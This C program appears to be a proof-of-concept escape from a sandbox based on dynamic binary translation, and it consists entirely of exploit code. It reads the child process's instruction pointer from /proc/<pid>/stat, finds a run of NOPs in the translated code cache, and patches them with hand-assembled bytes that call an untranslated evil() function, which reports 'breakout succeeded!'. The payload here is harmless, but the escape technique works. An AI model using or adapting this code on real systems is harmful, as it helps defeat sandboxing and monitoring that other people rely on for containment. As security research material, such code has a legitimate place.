#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void evil()
{
 printf("breakout succeeded!\n");
 _exit(0);
}

int main()
{
 FILE *file;
 char *hint;
 void *mem = malloc(16);
 char filename[50];
 int pid, status;
 char *tmp;
 int i, j;

 /* allocate shared memory area for parent to pass the hint to the child */
 int *shared_mem=mmap(NULL, 8, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1,0);
 int *loop = shared_mem; // loop exit variable for child
 int *shrhint = shared_mem + 4; // pointer to shared memory location of hint

 // initialize *loop, *shrhint
 *loop = 1;
 *shrhint = 0;

 hint = NULL;

 pid = fork(); // fork process

 if (pid < 0)
 { /* error occurred */
  printf("fork() failed\n");
  return 1;
 }
 else if (pid==0) { /* child process */

	printf("child before loop\n");

	while(*loop); // the eip inside this while will be found

modcode: // this nops will be modified so that the untranslated evil() gets called
	asm(
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	);

	hint = (char*)*shrhint; // get hint from parent
	printf("child hint = %x\n", hint);

	printf("searching for nops...\n");

	// search for 10 consecutive nops
	for(i = 0; i < 500; i++)
	{
		for(j = 0; j < 10; j++)
		{
			if(*(hint+i+j) != '\x90') break;
		}
		
		if(j > 9)
		{
			// the nops were found, modify nops and jump to it
			printf("10 nops found @ %x\n", (hint+i));
		
			//80483c3:       b8 d4 82 04 08          mov    $0x80482d4,%eax
			//80483c8:       ff d0                   call   *%eax
			// evil @ 0x08048624
			
			tmp = hint + i;
			*tmp++ = '\xb8';
			*tmp++ = '\x24';
			*tmp++ = '\x86';
			*tmp++ = '\x04';
			*tmp++ = '\x08';
			*tmp++ = '\xff';
			*tmp++ = '\xd0';
			
			goto modcode; // this should execute the modified code that calls evil()
			
			return 0;
		}
	}

 }
 else { /* parent process */
	printf("pid of child: %d\n", pid);
	sleep(2);
	sprintf(filename, "/proc/%d/stat", pid); // open /proc/<pid>/stat of child
	file = fopen(filename, "r");
	if(file == NULL) {
	printf("can't open /proc/%d/stat\n", pid);
		exit(0);
	}

	// get 30th value -> EIP
 	fscanf(file, "%d %s %c %d %d %d %d %d %u %lu %lu %lu %lu %lu %lu %ld %ld %ld %ld %ld %ld %llu %lu %ld %lu %lu %lu %lu %lu %lu", mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, mem, &hint);

	fclose(file);

	printf("parent hint = %x\n", hint);

	*shrhint = (int)hint; // set shared hint
	*loop = 0; // notify child to exit the loop
	wait(&status);
	exit(0);
 }

 return 0;
}
